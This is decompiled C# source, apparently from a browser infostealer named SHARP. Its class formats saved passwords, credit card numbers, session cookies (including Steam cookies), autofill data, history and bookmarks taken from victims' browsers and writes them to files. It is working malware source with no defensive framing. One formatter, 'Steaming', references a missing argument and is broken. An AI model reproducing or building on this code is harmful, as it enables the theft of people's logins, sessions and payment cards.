﻿using System;
using System.Collections.Generic;
using System.IO;

namespace SHARP
{
	// Token: 0x0200001A RID: 26
	internal sealed class cBrowserUtils
	{
		// Token: 0x06000094 RID: 148 RVA: 0x000044CC File Offset: 0x000026CC
		private static string FormatPassword(Password pPassword)
		{
			return string.Format("\nHostname: {0}\nUsername: {1}\nPassword: {2}\nBrowser: {3}\r\n", new object[]
			{
				pPassword.sUrl,
				pPassword.sUsername,
				pPassword.sPassword,
				pPassword.sBrowser
			});
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00004508 File Offset: 0x00002708
		private static string FormatCreditCard(CreditCard cCard)
		{
			return string.Format("Type: {0}\nNumber: {1}\nExp: {2}\nHolder: {3}\n\n", new object[]
			{
				Banking.DetectCreditCardType(cCard.sNumber),
				cCard.sNumber,
				cCard.sExpMonth + "/" + cCard.sExpYear,
				cCard.sName
			});
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00004564 File Offset: 0x00002764
		private static string FormatCookie(Cookie cCookie)
		{
			return string.Format("{0}\tTRUE\t{1}\tFALSE\t{5}\t{4}\t{2}\r\n", new object[]
			{
				cCookie.sHostKey,
				cCookie.sPath,
				cCookie.sExpiresUtc,
				cCookie.sName,
				cCookie.sValue,
				cCookie.sKey
			});
		}

		// Token: 0x06000097 RID: 151 RVA: 0x000045BC File Offset: 0x000027BC
		private static string Steaming(CookieSteam cCookie)
		{
			return string.Format("{0} TRUE {1} FALSE \n\t{5}    {4}\n\t{2}{3}\r\n", new object[]
			{
				cCookie.Host,
				cCookie.Path,
				cCookie.ExpiresUtc,
				cCookie.Name,
				cCookie.Key
			});
		}

		// Token: 0x06000098 RID: 152 RVA: 0x0000460B File Offset: 0x0000280B
		private static string FormatAutoFill(AutoFill aFill)
		{
			return string.Format("{0}\t\n{1}\t\n\n", aFill.sName, aFill.sValue);
		}

		// Token: 0x06000099 RID: 153 RVA: 0x00004623 File Offset: 0x00002823
		private static string FormatHistory(Site sSite)
		{
			return string.Format("URL: {0}\nSEARCH: ( {1} ) COUNTER: {2}\r\n\n", sSite.sTitle, sSite.sUrl, sSite.iCount);
		}

		// Token: 0x0600009A RID: 154 RVA: 0x00004649 File Offset: 0x00002849
		private static string FormatDownloads(Site sSite)
		{
			return string.Format("DOWNLOAD: {0}\r\n\n", sSite.sTitle);
		}

		// Token: 0x0600009B RID: 155 RVA: 0x0000465C File Offset: 0x0000285C
		private static string FormatBookmark(Bookmark bBookmark)
		{
			if (!string.IsNullOrEmpty(bBookmark.sUrl))
			{
				return string.Format("### {0} ### ({1})\n", bBookmark.sTitle, bBookmark.sUrl);
			}
			return string.Format("### {0} ###\n", bBookmark.sTitle);
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00004698 File Offset: 0x00002898
		public static bool WriteAutoFill(List<AutoFill> aFills, string sFile)
		{
			bool result;
			try
			{
				foreach (AutoFill aFill in aFills)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatAutoFill(aFill));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600009D RID: 157 RVA: 0x00004704 File Offset: 0x00002904
		public static bool WriteCookies(List<Cookie> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (Cookie cCookie in cCookies)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCookie(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600009E RID: 158 RVA: 0x00004770 File Offset: 0x00002970
		public static bool WriteSteaming(List<CookieSteam> cCookies, string sFile)
		{
			bool result;
			try
			{
				foreach (CookieSteam cCookie in cCookies)
				{
					File.AppendAllText(sFile, cBrowserUtils.Steaming(cCookie));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600009F RID: 159 RVA: 0x000047DC File Offset: 0x000029DC
		public static bool WriteDownloads(List<Site> sHistory, string sFile)
		{
			bool result;
			try
			{
				foreach (Site sSite in sHistory)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatDownloads(sSite));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00004848 File Offset: 0x00002A48
		public static bool WriteHistory(List<Site> sHistory, string sFile)
		{
			bool result;
			try
			{
				foreach (Site sSite in sHistory)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatHistory(sSite));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x000048B4 File Offset: 0x00002AB4
		public static bool WriteBookmarks(List<Bookmark> bBookmarks, string sFile)
		{
			bool result;
			try
			{
				foreach (Bookmark bBookmark in bBookmarks)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatBookmark(bBookmark));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x00004920 File Offset: 0x00002B20
		public static bool WritePasswords(List<Password> pPasswords, string sFile)
		{
			bool result;
			try
			{
				foreach (Password pPassword in pPasswords)
				{
					if (!(pPassword.sUsername == "") && !(pPassword.sPassword == ""))
					{
						File.AppendAllText(sFile, cBrowserUtils.FormatPassword(pPassword));
					}
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A3 RID: 163 RVA: 0x000049B0 File Offset: 0x00002BB0
		public static bool WriteCreditCards(List<CreditCard> cCC, string sFile)
		{
			bool result;
			try
			{
				foreach (CreditCard cCard in cCC)
				{
					File.AppendAllText(sFile, cBrowserUtils.FormatCreditCard(cCard));
				}
				result = true;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060000A4 RID: 164 RVA: 0x00004A1C File Offset: 0x00002C1C
		internal static void WriteCookies(string v)
		{
			throw new NotImplementedException();
		}
	}
}
